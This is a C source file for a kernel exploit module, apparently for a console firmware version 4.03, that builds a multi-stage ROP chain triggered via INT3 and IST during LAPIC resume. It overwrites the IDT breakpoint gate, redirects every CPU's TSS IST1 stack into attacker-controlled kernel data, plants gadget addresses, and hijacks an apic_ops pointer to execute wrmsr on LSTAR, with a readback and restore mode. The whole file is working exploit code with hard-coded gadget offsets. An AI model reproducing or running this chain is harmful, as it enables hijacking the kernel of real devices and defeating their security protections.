#include <stdint.h>

/*
 * resume_chain — Full INT3+IST ROP chain for LAPIC resume
 *
 * Uses INT 3 (CC byte in ktext function padding) + IST mechanism to
 * gain RSP control during LAPIC resume, then executes a ROP chain.
 *
 * Chain stages:
 *   INT3 → pop_all_iret (via IST) → loads partial regs from kdata
 *     → iretq → pop_all_iret (stage 1) → loads ECX/EAX/EDX for wrmsr
 *     → iretq → wrmsr_ret → writes MSR
 *     → ret → doreti_iret → iretq → get_timer_freq → ret (crash expected v1)
 *
 * For v1 (safe test): writes LSTAR back to its CURRENT value.
 * If the chain works but wrmsr writes the same value, system MIGHT survive.
 * Chain success proven by sentinel + trap frame capture in kdata.
 *
 * Mode (via fw_ver):
 *   0x1: ARM — full chain, apic_ops[2] = CC byte
 *   0x2: READBACK — check results, restore everything
 *   0x3: ARM_SAFE — IDT/TSS only, apic_ops[2] = get_timer_freq (no INT3)
 *
 * Output: see index comments in code below.
 */

#define MAGIC_RSCN       0x5253434E  /* "RSCN" */

/* FW 4.03 offsets */
#define IDT_OFF          0x64cdc80
#define TSS_OFF          0x64d0830
#define TSS_STRIDE       0x68
#define TSS_IST1_OFF     36
#define NCPUS            16
#define APIC_OPS_OFF_KTEXT  0x1934AC8

/* ktext gadget offsets (relative to kdata_base) */
#define OFF_POP_ALL_IRET   (-0x9cf8ab)
#define OFF_DORETI_IRET    (-0x9cf84c)
#define OFF_WRMSR_RET      (-0x9d20cc)
#define OFF_NOP_RET        (-0x9d20ca)
#define OFF_COPYIN         (-0x9908e0)

/* Chain layout in kdata */
#define IST1_TOP_OFF       0x300     /* IST1 points here */
#define STAGE1_OFF         0x400     /* Stage 1: full register load */
#define STAGE2_OFF         0x500     /* Stage 2: after wrmsr return */
#define SAVE_OFF           0x280     /* Originals save area */
#define SENTINEL_OFF       0x0F8     /* Chain-fired sentinel */
#define SENTINEL_VAL       0x434841494E464952ULL  /* "CHAINFIR" */

#define MSR_LSTAR          0xC0000082

typedef struct {
    uint64_t kdata_base;
    uint32_t fw_ver;
} kproc_args;

static inline uint64_t rdmsr(uint32_t msr)
{
    uint32_t lo, hi;
    __asm__ volatile("rdmsr" : "=a"(lo), "=d"(hi) : "c"(msr));
    return ((uint64_t)hi << 32) | lo;
}

static inline uint64_t read8(uint64_t addr)
{
    return *(volatile uint64_t*)addr;
}

static inline void write8(uint64_t addr, uint64_t val)
{
    *(volatile uint64_t*)addr = val;
}

static void read_idt_gate(uint64_t idt_base, int vec, uint64_t* lo, uint64_t* hi)
{
    *lo = read8(idt_base + vec * 16);
    *hi = read8(idt_base + vec * 16 + 8);
}

static void write_idt_gate(uint64_t idt_base, int vec, uint64_t lo, uint64_t hi)
{
    write8(idt_base + vec * 16, lo);
    write8(idt_base + vec * 16 + 8, hi);
}

static void build_idt_gate(uint64_t handler, uint8_t ist, uint8_t type_dpl_p,
                           uint16_t seg_sel, uint64_t* lo, uint64_t* hi)
{
    *lo = (handler & 0xFFFF)
        | ((uint64_t)seg_sel << 16)
        | ((uint64_t)ist << 32)
        | ((uint64_t)type_dpl_p << 40)
        | ((handler >> 16 & 0xFFFF) << 48);
    *hi = (handler >> 32) & 0xFFFFFFFF;
}

int module_start(kproc_args* args)
{
    uint64_t kdata_base = args->kdata_base;
    uint32_t mode = args->fw_ver;
    volatile uint64_t* out = (volatile uint64_t*)args;
    volatile uint32_t* out32 = (volatile uint32_t*)args;

    for (int i = 0; i < 140; i++)
        out[i] = 0;

    uint64_t lstar = rdmsr(0xC0000082);
    uint64_t ktext_base = lstar - 0x294218;
    uint64_t idt_base = kdata_base + IDT_OFF;
    uint64_t tss_base = kdata_base + TSS_OFF;

    uint64_t pop_all_iret = kdata_base + OFF_POP_ALL_IRET;
    uint64_t doreti_iret  = kdata_base + OFF_DORETI_IRET;
    uint64_t wrmsr_ret    = kdata_base + OFF_WRMSR_RET;
    uint64_t nop_ret      = kdata_base + OFF_NOP_RET;

    uint64_t apic_ops_addr = ktext_base + APIC_OPS_OFF_KTEXT;
    volatile uint64_t* apic = (volatile uint64_t*)apic_ops_addr;
    uint64_t get_timer_freq = apic[19];

    volatile uint64_t* save = (volatile uint64_t*)(kdata_base + SAVE_OFF);

    out32[0] = MAGIC_RSCN;
    out[1] = kdata_base;
    out[2] = ktext_base;

    if (mode == 0x1 || mode == 0x3) {
        /*
         * ARM MODE
         *
         * 1. Modify IDT[3] → handler=pop_all_iret, IST=1
         * 2. Modify TSS IST1 → kdata chain buffer
         * 3. Write chain data to kdata
         * 4. Point apic_ops[2] at CC byte (mode 0x1) or get_timer_freq (mode 0x3)
         */

        /* Save originals */
        uint64_t orig_lo, orig_hi;
        read_idt_gate(idt_base, 3, &orig_lo, &orig_hi);
        save[0] = orig_lo;
        save[1] = orig_hi;
        save[2] = read8(tss_base + TSS_IST1_OFF);
        save[3] = apic[2];

        /* Modify IDT[3]: handler = pop_all_iret, IST = 1, interrupt gate */
        uint16_t seg_sel = (orig_lo >> 16) & 0xFFFF;
        uint64_t new_lo, new_hi;
        build_idt_gate(pop_all_iret, 1, 0x8E, seg_sel, &new_lo, &new_hi);
        write_idt_gate(idt_base, 3, new_lo, new_hi);

        /* Modify TSS IST1 for all active CPUs */
        uint64_t ist1_val = kdata_base + IST1_TOP_OFF;
        uint32_t cpus = 0;
        for (int c = 0; c < NCPUS; c++) {
            uint64_t tss = tss_base + TSS_STRIDE * c;
            uint64_t rsp0 = read8(tss + 4);
            if (rsp0 > 0xFFFF800000000000ULL) {
                write8(tss + TSS_IST1_OFF, ist1_val);
                cpus++;
            }
        }

        /*
         * ════════════════════════════════════════════
         * Write ROP chain to kdata
         * ════════════════════════════════════════════
         *
         * IST1 = kdata+0x300. When INT3 fires:
         * CPU pushes to [0x2D8..0x2F8]: RIP, CS, RFLAGS, RSP, SS
         * Handler (pop_all_iret) entry RSP = kdata+0x2D8
         *
         * pop_all_iret pops 15 regs going UP from 0x2D8:
         *   [0x2D8] → rdi (= trap RIP)
         *   [0x2E0] → rsi (= trap CS)
         *   [0x2E8] → rdx (= trap RFLAGS)
         *   [0x2F0] → rcx (= trap RSP ★)
         *   [0x2F8] → r8  (= trap SS)
         *   [0x300] → r9  (OUR DATA)
         *   [0x308] → rax (OUR DATA)
         *   ... continuing up ...
         *
         * Then add rsp, 0x20 (skip 4 qwords)
         * Then iretq (reads 5 qwords: RIP, CS, RFLAGS, RSP, SS)
         */

        /* Stage 0: pops 6-15 at kdata+0x300 (IST1 top) */
        uint64_t s0 = kdata_base + IST1_TOP_OFF;
        write8(s0 + 0*8, 0);              /* pop r9  */
        write8(s0 + 1*8, 0);              /* pop rax */
        write8(s0 + 2*8, 0);              /* pop rbx */
        write8(s0 + 3*8, 0);              /* pop rbp */
        write8(s0 + 4*8, 0);              /* pop r10 */
        write8(s0 + 5*8, 0);              /* pop r11 */
        write8(s0 + 6*8, 0);              /* pop r12 */
        write8(s0 + 7*8, 0);              /* pop r13 */
        write8(s0 + 8*8, 0);              /* pop r14 */
        write8(s0 + 9*8, 0);              /* pop r15 */
        /* add rsp, 0x20 skips 4 qwords */
        write8(s0 + 10*8, 0);             /* skip */
        write8(s0 + 11*8, 0);             /* skip */
        write8(s0 + 12*8, 0);             /* skip */
        write8(s0 + 13*8, 0);             /* skip */
        /* iret frame → Stage 1 */
        write8(s0 + 14*8, pop_all_iret);  /* RIP = pop_all_iret */
        write8(s0 + 15*8, 0x20);          /* CS = kernel */
        write8(s0 + 16*8, 0x2);           /* RFLAGS */
        write8(s0 + 17*8, kdata_base + STAGE1_OFF); /* RSP = Stage 1 */
        write8(s0 + 18*8, 0);             /* SS */

        /* Stage 1: at kdata+0x400 — pop_all_iret loads ALL registers */
        /* v1 safe test: write LSTAR back to its current value */
        uint64_t new_lstar = lstar;
        uint64_t s1 = kdata_base + STAGE1_OFF;
        write8(s1 + 0*8,  0);                      /* pop rdi */
        write8(s1 + 1*8,  0);                      /* pop rsi */
        write8(s1 + 2*8,  (uint64_t)(new_lstar >> 32));  /* pop rdx = high32 */
        write8(s1 + 3*8,  MSR_LSTAR);              /* pop rcx = 0xC0000082 */
        write8(s1 + 4*8,  0);                      /* pop r8 */
        write8(s1 + 5*8,  0);                      /* pop r9 */
        write8(s1 + 6*8,  (uint64_t)(new_lstar & 0xFFFFFFFF)); /* pop rax = low32 */
        write8(s1 + 7*8,  0);                      /* pop rbx */
        write8(s1 + 8*8,  0);                      /* pop rbp */
        write8(s1 + 9*8,  0);                      /* pop r10 */
        write8(s1 + 10*8, 0);                      /* pop r11 */
        write8(s1 + 11*8, 0);                      /* pop r12 */
        write8(s1 + 12*8, 0);                      /* pop r13 */
        write8(s1 + 13*8, 0);                      /* pop r14 */
        write8(s1 + 14*8, 0);                      /* pop r15 */
        /* add rsp, 0x20 */
        write8(s1 + 15*8, 0);
        write8(s1 + 16*8, 0);
        write8(s1 + 17*8, 0);
        write8(s1 + 18*8, 0);
        /* iret → wrmsr_ret */
        write8(s1 + 19*8, wrmsr_ret);              /* RIP = wrmsr;ret */
        write8(s1 + 20*8, 0x20);                   /* CS */
        write8(s1 + 21*8, 0x2);                    /* RFLAGS */
        write8(s1 + 22*8, kdata_base + STAGE2_OFF);/* RSP = Stage 2 */
        write8(s1 + 23*8, 0);                      /* SS */

        /*
         * Stage 2: at kdata+0x500
         * wrmsr_ret does: wrmsr, then ret → pops [kdata+0x500] as RIP.
         *
         * After wrmsr, chain to get_timer_freq for return value,
         * then accept crash (v1). The sentinel at kdata+0x0F8 proves
         * the chain fired, and the trap frame at kdata+0x2D8 gives us
         * the original RSP for v2 clean return.
         */
        uint64_t s2 = kdata_base + STAGE2_OFF;
        write8(s2 + 0*8, doreti_iret);    /* ret pops this → iretq */
        /* iret frame → get_timer_freq */
        write8(s2 + 1*8, get_timer_freq); /* RIP */
        write8(s2 + 2*8, 0x20);           /* CS */
        write8(s2 + 3*8, 0x2);            /* RFLAGS */
        write8(s2 + 4*8, kdata_base + 0x600); /* RSP (dummy) */
        write8(s2 + 5*8, 0);              /* SS */

        /*
         * Stage 3: at kdata+0x600
         * get_timer_freq does: reads timer freq → returns in RAX → ret
         * ret pops [kdata+0x600] as RIP.
         *
         * We chain to nop_ret (another ret) which pops [0x608].
         * [0x608] = 0 → crash. But by now wrmsr has already fired.
         *
         * The sentinel proves the chain executed. v2 will use the
         * trapped RSP from kdata+0x2F0 for a clean return.
         */
        write8(kdata_base + 0x600, nop_ret);  /* get_timer_freq ret → nop_ret */
        write8(kdata_base + 0x608, 0);         /* nop_ret ret → crash (0) */

        /* Write sentinel (this is in kdata, persists through suspend) */
        write8(kdata_base + SENTINEL_OFF, SENTINEL_VAL);

        /* Set apic_ops[2] */
        uint64_t cc_candidate = kdata_base + OFF_COPYIN - 1;
        if (mode == 0x1)
            apic[2] = cc_candidate;   /* CC byte → triggers INT3 */
        else
            apic[2] = get_timer_freq; /* safe, no INT3 */

        /* Report */
        out[3]  = (mode == 0x1) ? cc_candidate : get_timer_freq;
        out[4]  = pop_all_iret;
        out[5]  = doreti_iret;
        out[6]  = wrmsr_ret;
        out[7]  = get_timer_freq;
        out[8]  = ist1_val;
        out[9]  = kdata_base + SENTINEL_OFF;
        out[10] = save[3];  /* original apic_ops[2] */
        out[11] = cpus;
        out[12] = lstar;
        out[13] = new_lstar;

        out32[1] = 0x0001;

    } else if (mode == 0x2) {
        /* READBACK MODE */

        /* Chain sentinel */
        uint64_t sentinel = read8(kdata_base + SENTINEL_OFF);
        out[3] = sentinel;
        out[4] = (sentinel == SENTINEL_VAL) ? 1 : 0;

        /* Current LSTAR */
        uint64_t cur_lstar = rdmsr(MSR_LSTAR);
        out[5] = cur_lstar;
        out[6] = (cur_lstar != lstar) ? 1 : 0;  /* changed? */

        /* Current IDT[3] */
        uint64_t lo, hi;
        read_idt_gate(idt_base, 3, &lo, &hi);
        out[7] = lo;
        out[8] = hi;

        /* Current TSS[0] IST1 */
        out[9] = read8(tss_base + TSS_IST1_OFF);

        /* Current apic_ops[2] */
        out[10] = apic[2];

        /* Trap frame from INT3 (CPU pushed to IST stack during resume) */
        uint64_t tf = kdata_base + IST1_TOP_OFF - 40; /* RIP is lowest */
        out[11] = read8(tf);          /* trap RIP */
        out[12] = read8(tf + 24);     /* trap RSP (offset +24 in frame) */
        out[13] = read8(tf + 16);     /* trap RFLAGS */

        /* Restore everything */
        write_idt_gate(idt_base, 3, save[0], save[1]);
        out[14] = save[0];

        uint64_t orig_ist1 = save[2];
        for (int c = 0; c < NCPUS; c++) {
            uint64_t tss = tss_base + TSS_STRIDE * c;
            if (read8(tss + 4) > 0xFFFF800000000000ULL)
                write8(tss + TSS_IST1_OFF, orig_ist1);
        }

        /* Restore apic_ops[2] via set_tpr-8 trick */
        apic[2] = apic[18] - 8;
        out[15] = apic[2];

        out32[1] = 0x0001;

    } else {
        out32[1] = 0xFF;
    }

    out[131] = 0xdeadbeefcafe0040ULL;
    return 0;
}
